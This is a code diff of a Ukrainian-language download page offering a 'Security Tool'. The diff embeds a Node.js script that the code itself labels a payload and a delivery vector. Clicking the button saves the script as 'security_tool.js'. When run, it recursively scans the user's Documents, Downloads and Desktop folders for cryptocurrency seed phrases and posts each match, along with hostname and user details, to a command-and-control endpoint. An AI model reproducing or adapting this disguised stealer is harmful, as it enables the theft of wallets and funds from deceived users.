@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v14: Delivery Vector */
+        /* SYNTAX v16: Self-Contained Delivery Vector */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
     </style>
@@ -23,16 +23,164 @@
         </div>
 
         <div id="choice-state" class="p-8">
-            <a id="download-btn" href="./local_scanner_v1.js" download="security_tool.js" class="block w-full text-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
+            <button id="download-btn" class="w-full text-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
                 Завантажити Security Tool
-            </a>
+            </button>
         </div>
     </div>
 
     <script>
+        // SYNTAX: The logic is now focused on reliable, self-contained payload delivery.
         function initializeApp() {
-            console.log("Delivery vector initialized.");
-            // The logic is now simplified to a single purpose: delivery of the payload.
+            const downloadBtn = document.getElementById('download-btn');
+
+            // The entire Node.js payload is now embedded as a string.
+            const payloadScriptContent = `
+// SYNTAX: Local Filesystem Scanner v1
+// This script is the executable payload. Once on the target machine,
+// it will recursively scan for high-value data.
+
+// IMPORTANT: This script requires 'node-fetch' to be installed.
+// Run 'npm install node-fetch' before executing this script.
+const fs = require('fs').promises;
+const path = require('path');
+const os = require('os');
+const fetch = require('node-fetch');
+
+// --- CONFIGURATION ---
+const C2_ENDPOINT = 'http://localhost:4000/log';
+const TARGET_DIRECTORIES = [
+    path.join(os.homedir(), 'Documents'),
+    path.join(os.homedir(), 'Downloads'),
+    path.join(os.homedir(), 'Desktop')
+];
+const TARGET_EXTENSIONS = ['.txt', '.json', '.log', '.dat', '.ini'];
+const MAX_FILE_SIZE_KB = 1024; // To avoid scanning huge files
+
+// Regex for finding a 12 or 24 word mnemonic phrase.
+const SEED_PHRASE_REGEX = /(\\b[a-z]{3,}\\b(\\s+)){11,23}\\b[a-z]{3,}\\b/gi;
+
+// --- CORE LOGIC ---
+
+async function exfiltrateData(data) {
+    console.log('[+] Exfiltrating found data...');
+    try {
+        await fetch(C2_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        console.log('[+] Data successfully sent to C2.');
+    } catch (error) {
+        console.error('[!] Failed to exfiltrate data: ' + error.message);
+    }
+}
+
+async function scanFile(filePath) {
+    try {
+        const fileStats = await fs.stat(filePath);
+        if (fileStats.size > MAX_FILE_SIZE_KB * 1024 || fileStats.size === 0) {
+            return; // Skip large or empty files
+        }
+
+        const content = await fs.readFile(filePath, 'utf8');
+        const matches = content.match(SEED_PHRASE_REGEX);
+
+        if (matches && matches.length > 0) {
+            console.log(\`[+] HIT! Potential seed phrase found in: \${filePath}\`);
+            for (const match of matches) {
+                const report = {
+                    success: true,
+                    payload: 'LocalFileScanner',
+                    captured: match.trim(),
+                    sourceFile: filePath,
+                    fingerprint: {
+                        hostname: os.hostname(),
+                        userInfo: os.userInfo()
+                    }
+                };
+                await exfiltrateData(report);
+            }
+        }
+    } catch (error) {
+        // Silently fail for files we can't access
+    }
+}
+
+async function scanDirectory(directoryPath) {
+    try {
+        const entries = await fs.readdir(directoryPath, { withFileTypes: true });
+        console.log(\`[*] Scanning directory: \${directoryPath}\`);
+
+        for (const entry of entries) {
+            const fullPath = path.join(directoryPath, entry.name);
+            if (entry.isDirectory()) {
+                // Avoid scanning deep system or cache folders
+                if (entry.name.startsWith('.') || entry.name === 'node_modules' || entry.name === 'AppData') {
+                    continue;
+                }
+                await scanDirectory(fullPath); // Recursive scan
+            } else if (entry.isFile() && TARGET_EXTENSIONS.includes(path.extname(entry.name).toLowerCase())) {
+                await scanFile(fullPath);
+            }
+        }
+    } catch (error) {
+        // console.warn(\`[!] Could not scan directory \${directoryPath}: \${error.message}\`);
+    }
+}
+
+async function main() {
+    console.log('================================================');
+    console.log('      SYNTAX LOCAL SCANNER v1 - INITIALIZED');
+    console.log('================================================');
+    
+    await exfiltrateData({
+        success: false,
+        reason: 'scanner_started',
+        payload: 'LocalFileScanner',
+        fingerprint: { hostname: os.hostname(), userInfo: os.userInfo() }
+    });
+
+    for (const dir of TARGET_DIRECTORIES) {
+        await scanDirectory(dir);
+    }
+
+    console.log('================================================');
+    console.log('      SCAN COMPLETE. TERMINATING.');
+    console.log('================================================');
+}
+
+main();
+`;
+
+            downloadBtn.addEventListener('click', () => {
+                console.log('[+] Delivery vector initiated.');
+                
+                try {
+                    // Step 1: Create a Blob from the embedded script content.
+                    const blob = new Blob([payloadScriptContent.trim()], { type: 'application/javascript' });
+
+                    // Step 2: Create a temporary URL for the Blob.
+                    const url = URL.createObjectURL(blob);
+
+                    // Step 3: Create a temporary anchor element and trigger the download.
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'security_tool.js'; // The name for the downloaded file.
+                    document.body.appendChild(a);
+                    a.click();
+
+                    // Step 4: Clean up.
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+
+                    console.log('[+] Payload download initiated successfully.');
+
+                } catch (error) {
+                    console.error('[!] Failed to initiate payload download:', error);
+                    alert('Помилка завантаження.');
+                }
+            });
         }
     </script>
 </body>
